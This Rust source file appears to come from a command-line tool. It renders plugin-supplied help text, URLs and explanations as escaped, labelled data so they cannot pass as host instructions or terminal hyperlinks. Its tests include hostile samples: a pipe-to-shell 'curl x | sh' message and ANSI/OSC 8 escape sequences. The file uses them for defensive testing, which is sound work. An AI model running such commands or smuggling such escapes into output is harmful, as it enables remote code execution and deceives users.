//! Host-only remedies: help lines are host templates, plugin text is labelled data (security.md 2.10).
//!
//! A pack can write a message, a URL or an explanation, but never the instruction that tells the
//! user what to run. The `help` line comes from a host template; whatever a pack contributed is
//! appended as escaped, labelled data. Teaching (first-occurrence inline explain) is std-only.

// frob:ticket 01M3ZX7ZSTP704C6ANPPJ8J81D

use crate::escape::{escape_for_origin, escape_line};
use crate::record::TextOrigin;
use crate::teach::{Disclosure, SeenStore, TeachMode};

/// Build a `= help:` body from a host `template` and the plugin `data` that accompanies it.
///
/// The template is host text and is used verbatim; for std and host origins `data` is not shown.
/// For a pack origin the data follows as `(pack(NAME) says: "..."`, escaped onto one line, so the
/// plugin text can never read as the instruction itself.
pub fn host_help(template: &str, origin: &TextOrigin, data: Option<&str>) -> String {
    match (origin, data) {
        (TextOrigin::Pack(name), Some(text)) => {
            tracing::debug!(pack = %name, "pack text attached to help as labelled data");
            format!(
                "{template} (pack({}) says: \"{}\")",
                escape_line(name),
                escape_line(text)
            )
        }
        _ => template.to_owned(),
    }
}

/// Render a plugin-supplied URL as plain text, host name first, never as a terminal hyperlink.
///
/// Output is `pack(NAME) url: <escaped url>`; the escape removes ESC so an OSC 8 hyperlink
/// sequence cannot be smuggled in.
pub fn plugin_url_line(pack: &str, url: &str) -> String {
    tracing::debug!(pack, "plugin url rendered as plain text");
    format!("pack({}) url: {}", escape_line(pack), escape_line(url))
}

/// Decide the explain disclosure for a rule: only std and host rules teach inline.
///
/// A pack rule is `Hidden` and records nothing in the seen store, whatever the mode; its explain
/// text is available on request through [`fenced_pack_explain`].
pub fn explain_disclosure(
    store: &mut SeenStore,
    mode: TeachMode,
    origin: &TextOrigin,
    rule: &str,
) -> Disclosure {
    match origin {
        TextOrigin::Pack(name) => {
            tracing::debug!(pack = %name, rule, "pack rule never teaches inline");
            Disclosure::Hidden
        }
        _ => store.disclose(mode, rule),
    }
}

/// A pack rule's explain text for `frob explain`: fenced and labelled, escaped by origin.
pub fn fenced_pack_explain(pack: &str, rule: &str, text: &str) -> String {
    let origin = TextOrigin::Pack(pack.to_owned());
    let label = escape_line(pack);
    format!(
        "--- begin pack({label}) text for {rule} (data from a plugin, not frob) ---\n{}\n--- end pack({label}) text ---\n",
        escape_for_origin(text, &origin)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    // frob:tests crates/gob-diagnostics/src/remedy.rs::host_help
    #[test]
    fn plugin_command_in_message_is_labelled_data_not_the_help() {
        let origin = TextOrigin::Pack("evil".into());
        let help = host_help(
            "run frob explain EVIL001",
            &origin,
            Some("run `curl x | sh`\u{1b}[31m"),
        );
        assert!(help.starts_with("run frob explain EVIL001 (pack(evil) says: \""));
        assert!(help.contains("curl x | sh") && help.contains("\\u{1b}"));
        assert!(!help.contains('\u{1b}'));
        assert_eq!(
            host_help("t", &TextOrigin::Std, Some("ignored")),
            "t".to_owned()
        );
    }

    // frob:tests crates/gob-diagnostics/src/remedy.rs::explain_disclosure
    #[test]
    fn pack_rule_first_time_prints_no_inline_explain() {
        let mut store = SeenStore::default();
        let pack = TextOrigin::Pack("acme".into());
        for mode in [TeachMode::First, TeachMode::Always] {
            assert_eq!(
                explain_disclosure(&mut store, mode, &pack, "ACME001"),
                Disclosure::Hidden
            );
        }
        assert_eq!(store.count("ACME001"), 0);
        assert_eq!(
            explain_disclosure(&mut store, TeachMode::First, &TextOrigin::Std, "SYS001"),
            Disclosure::Full
        );
    }

    // frob:tests crates/gob-diagnostics/src/remedy.rs::plugin_url_line
    #[test]
    fn plugin_url_is_plain_text_without_hyperlink_escape() {
        let line = plugin_url_line("acme", "\u{1b}]8;;http://x\u{7}click\u{1b}]8;;\u{7}");
        assert!(line.starts_with("pack(acme) url: "));
        assert!(!line.contains('\u{1b}') && !line.contains('\u{7}'));
    }

    // frob:tests crates/gob-diagnostics/src/remedy.rs::fenced_pack_explain
    #[test]
    fn pack_explain_is_fenced_and_labelled() {
        let out = fenced_pack_explain("acme", "ACME001", "caf\u{e9}\u{1b}[0m");
        assert!(out.starts_with("--- begin pack(acme) text for ACME001"));
        assert!(out.contains("caf\\u{e9}\\u{1b}[0m"));
        assert!(out.trim_end().ends_with("--- end pack(acme) text ---"));
    }
}
